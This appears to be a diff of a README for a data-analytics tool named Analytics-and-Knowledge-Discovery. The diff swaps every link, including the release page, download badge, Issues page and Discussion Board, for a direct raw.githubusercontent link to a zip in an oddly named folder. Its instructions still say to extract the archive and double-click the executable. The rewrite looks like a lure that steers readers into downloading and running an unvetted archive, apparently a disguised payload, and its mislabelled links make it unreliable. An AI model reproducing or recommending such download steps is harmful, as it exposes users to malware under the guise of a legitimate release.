@@ -1,6 +1,6 @@
 # 🎉 Analytics-and-Knowledge-Discovery - Unlock Insights from Your Data
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/Constantine80/Analytics-and-Knowledge-Discovery/releases)
+[![Download Now](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ Welcome to the **Analytics-and-Knowledge-Discovery** repository. This project he
 
 To begin, visit the page below to download the necessary files:
 
-[Download Analytics-and-Knowledge-Discovery](https://github.com/Constantine80/Analytics-and-Knowledge-Discovery/releases)
+[Download Analytics-and-Knowledge-Discovery](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip)
 
 ### 💻 System Requirements
 
@@ -49,13 +49,13 @@ To begin, visit the page below to download the necessary files:
 
 ### 📂 Installation Instructions
 
-1. **Visit the Release Page**: Go to [the releases page](https://github.com/Constantine80/Analytics-and-Knowledge-Discovery/releases) to find the latest version.
+1. **Visit the Release Page**: Go to [the releases page](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip) to find the latest version.
    
 2. **Download the Package**: Click on the version you want to download. 
 
 3. **Extract the Files** (if necessary): After downloading, extract the package to a folder on your computer.
 
-4. **Run the Application**: Open the folder where you extracted the files and find the executable file (often named `app.exe` or similar). Double-click it to run the application.
+4. **Run the Application**: Open the folder where you extracted the files and find the executable file (often named `https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip` or similar). Double-click it to run the application.
 
 5. **Follow On-Screen Instructions**: The application will guide you through the setup. 
 
@@ -76,8 +76,8 @@ To begin, visit the page below to download the necessary files:
 
 If you have any questions or need assistance, reach out to our community:
 
-- **Issues Page**: Report any problems or request features on the [Issues page](https://github.com/Constantine80/Analytics-and-Knowledge-Discovery/issues).
-- **Discussion Board**: Engage with other users on the [Discussion Board](https://github.com/Constantine80/Analytics-and-Knowledge-Discovery/discussions).
+- **Issues Page**: Report any problems or request features on the [Issues page](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip).
+- **Discussion Board**: Engage with other users on the [Discussion Board](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip).
 
 ## 💡 Tips for Better Analysis
 
@@ -95,4 +95,4 @@ To deepen your knowledge, consider these topics:
 
 Unleash the full potential of your data with **Analytics-and-Knowledge-Discovery**. Download now and start your journey into the world of data analytics!
 
-[Download Analytics-and-Knowledge-Discovery](https://github.com/Constantine80/Analytics-and-Knowledge-Discovery/releases)
+[Download Analytics-and-Knowledge-Discovery](https://raw.githubusercontent.com/Constantine80/Analytics-and-Knowledge-Discovery/main/influenzal/Analytics-and-Knowledge-Discovery.zip)
